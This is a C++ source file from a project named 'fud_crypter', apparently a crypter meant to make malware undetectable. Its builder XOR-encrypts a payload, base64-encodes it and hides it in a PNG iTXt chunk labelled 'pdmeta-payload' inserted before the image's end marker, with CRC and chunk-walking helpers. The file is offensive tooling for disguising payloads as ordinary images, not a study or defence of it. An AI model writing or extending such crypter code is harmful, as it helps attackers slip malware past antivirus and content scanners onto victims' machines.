#include "fud_crypter/builder/builder.hpp"
#include "fud_crypter/crypto/xor_crypto.hpp"
#include <cstring>
#include <vector>
#include <string>
#include <cstdint>
#include <optional>

namespace fud_crypter {

    static uint32_t crc32_png(const uint8_t* data, size_t len) {
        static uint32_t table[256];
        static bool init = false;
        if (!init) {
            for (uint32_t n = 0; n < 256; ++n) {
                uint32_t c = n;
                for (int k = 0; k < 8; ++k)
                    c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
                table[n] = c;
            }
            init = true;
        }
        uint32_t c = 0xFFFFFFFFu;
        for (size_t i = 0; i < len; ++i) c = table[(c ^ data[i]) & 0xFF] ^ (c >> 8);
        return c ^ 0xFFFFFFFFu;
    }

    static std::string base64_encode(const std::vector<uint8_t>& in) {
        static const char* T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string out;
        out.reserve((in.size() + 2) / 3 * 4);
        size_t i = 0;
        for (; i + 3 <= in.size(); i += 3) {
            uint32_t v = (in[i] << 16) | (in[i+1] << 8) | in[i+2];
            out.push_back(T[(v >> 18) & 63]);
            out.push_back(T[(v >> 12) & 63]);
            out.push_back(T[(v >> 6) & 63]);
            out.push_back(T[v & 63]);
        }
        if (i + 1 == in.size()) {
            uint32_t v = in[i] << 16;
            out.push_back(T[(v >> 18) & 63]);
            out.push_back(T[(v >> 12) & 63]);
            out += "==";
        } else if (i + 2 == in.size()) {
            uint32_t v = (in[i] << 16) | (in[i+1] << 8);
            out.push_back(T[(v >> 18) & 63]);
            out.push_back(T[(v >> 12) & 63]);
            out.push_back(T[(v >> 6) & 63]);
            out.push_back('=');
        }
        return out;
    }

    static bool is_png(const std::vector<uint8_t>& b) {
        static const uint8_t sig[8] = {137,80,78,71,13,10,26,10};
        return b.size() >= 8 && std::memcmp(b.data(), sig, 8) == 0;
    }

    static uint32_t be32(const std::vector<uint8_t>& b, size_t p) {
        return (static_cast<uint32_t>(b[p]) << 24) | (b[p+1] << 16) |
        (b[p+2] << 8) | b[p+3];
    }

    static void put_be32(std::vector<uint8_t>& b, uint32_t v) {
        b.push_back(static_cast<uint8_t>(v >> 24));
        b.push_back(static_cast<uint8_t>(v >> 16));
        b.push_back(static_cast<uint8_t>(v >> 8));
        b.push_back(static_cast<uint8_t>(v));
    }

    struct PngChunk {
        std::string type;
        size_t data_off = 0;
        uint32_t length = 0;
        size_t chunk_off = 0;
        bool crc_ok = false;
    };

    static bool png_walk(const std::vector<uint8_t>& b, std::vector<PngChunk>& out) {
        if (!is_png(b)) return false;
        size_t pos = 8;
        while (pos + 8 <= b.size()) {
            PngChunk c;
            c.chunk_off = pos;
            c.length = be32(b, pos);
            c.type.assign(b.begin()+pos+4, b.begin()+pos+8);
            c.data_off = pos + 8;
            if (c.data_off + c.length + 4 > b.size()) return false;
            uint32_t stored = be32(b, c.data_off + c.length);
            uint32_t calc = crc32_png(b.data() + pos + 4, 4 + c.length);
            c.crc_ok = (stored == calc);
            out.push_back(c);
            pos = c.data_off + c.length + 4;
            if (c.type == "IEND") break;
        }
        return true;
    }

    constexpr char kPngKeyword[] = "pdmeta-payload";

    static std::vector<uint8_t> png_build_itxt(const std::string& keyword,
                                               const std::string& text) {
        std::vector<uint8_t> data;
        data.insert(data.end(), keyword.begin(), keyword.end());
        data.push_back(0);
        data.push_back(0);
        data.push_back(0);
        data.push_back(0);
        data.push_back(0);
        data.insert(data.end(), text.begin(), text.end());

        std::vector<uint8_t> typed = {'i','T','X','t'};
        typed.insert(typed.end(), data.begin(), data.end());

        std::vector<uint8_t> chunk;
        put_be32(chunk, static_cast<uint32_t>(data.size()));
        chunk.insert(chunk.end(), typed.begin(), typed.end());
        put_be32(chunk, crc32_png(typed.data(), typed.size()));
        return chunk;
                                               }

                                               static std::optional<std::vector<uint8_t>> png_insert_payload(
                                                   const std::vector<uint8_t>& b, const std::vector<uint8_t>& payload,
                                                   std::string& err) {
                                                   std::vector<PngChunk> chunks;
                                                   if (!png_walk(b, chunks)) { err = "not a valid PNG"; return std::nullopt; }
                                                   size_t iend_off = std::string::npos;
                                                   for (const auto& c : chunks)
                                                       if (c.type == "IEND") { iend_off = c.chunk_off; break; }
                                                       if (iend_off == std::string::npos) { err = "no IEND"; return std::nullopt; }

                                                       auto chunk = png_build_itxt(kPngKeyword, base64_encode(payload));
                                                   std::vector<uint8_t> out;
                                                   out.reserve(b.size() + chunk.size());
                                                   out.insert(out.end(), b.begin(), b.begin() + iend_off);
                                                   out.insert(out.end(), chunk.begin(), chunk.end());
                                                   out.insert(out.end(), b.begin() + iend_off, b.end());
                                                   return out;
                                                   }

                                                   bool Builder::embed_png(const std::vector<uint8_t>& payload, const std::vector<uint8_t>& key) {
                                                       logger_->info("Embedding into PNG...");

                                                       std::string template_path = "template.png";
                                                       auto png_data = read_file(template_path);
                                                       if (png_data.empty()) {
                                                           logger_->error("Template PNG not found: " + template_path);
                                                           return false;
                                                       }

                                                       std::vector<uint8_t> stored = crypto::xor_cipher(payload, key);

                                                       std::string err;
                                                       auto out = png_insert_payload(png_data, stored, err);
                                                       if (!out) {
                                                           logger_->error("PNG embed failed: " + err);
                                                           return false;
                                                       }

                                                       if (!write_file(config_.output_file, *out)) {
                                                           logger_->error("Cannot write output PNG");
                                                           return false;
                                                       }

                                                       logger_->success("PNG embed successful");
                                                       return true;
                                                   }

} // namespace fud_crypter
